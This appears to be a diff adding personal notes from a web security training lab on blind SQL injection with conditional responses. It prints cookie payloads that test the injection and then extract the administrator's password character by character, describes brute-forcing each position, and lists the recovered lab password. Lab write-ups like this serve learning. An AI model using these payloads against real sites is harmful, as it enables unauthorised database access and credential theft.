@@ -1,0 +1,17 @@
+Lab: Blind SQL injection with conditional responses
+
+Looking for "Welcome back!" text in response. This confirms that query returned results
+
+Sent request to repeater, and this value for Cookie returned the welcome back prompt:
+Cookie: TrackingId=qFseZCsxVc45lK5G' AND 1=1--; session=EP7Qd8UQgzxg3PAnfl6xdBIQs4CLEhZZ
+
+This shows that cookie is vulnerable to sql injection
+
+Modified the cookie as so to begin creating the password of the administrator user:
+Cookie: TrackingId=qFseZCsxVc45lK5G' AND SUBSTRING((SELECT password from users where username = 'administrator'), 1, 1) > 'a; session=EP7Qd8UQgzxg3PAnfl6xdBIQs4CLEhZZ
+
+Sent to repeater and set "a" as a position. Used list of a-z, A-Z, and 0-9
+After success, iterated over next character
+
+password:
+geeb54mcmnql2n0yjzgh
